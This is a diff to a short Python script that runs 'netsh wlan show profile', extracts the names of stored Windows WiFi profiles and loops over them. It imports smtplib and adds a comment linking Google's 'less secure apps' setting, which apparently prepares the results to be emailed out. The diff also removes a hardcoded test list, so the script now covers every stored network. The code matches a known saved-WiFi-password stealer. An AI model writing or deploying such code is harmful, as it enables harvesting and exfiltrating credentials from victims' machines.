@@ -1,5 +1,7 @@
 #!/usr/bin/env python
 
+###https://myaccount.google.com/lesssecureapps###
+
 import subprocess, smtplib, re
 from re import findall
 
@@ -23,7 +25,6 @@ command = "netsh wlan show profile"
 networks = subprocess.check_output(command, shell=True)
 networks = str(networks)
 networks_names_list = re.findall("(?:Profile\s*:\s)(.*)", networks)
-networks_names_list = ["Moti", "AndroidAP"]
 
 result = ""
 for network_name in networks_names_list:
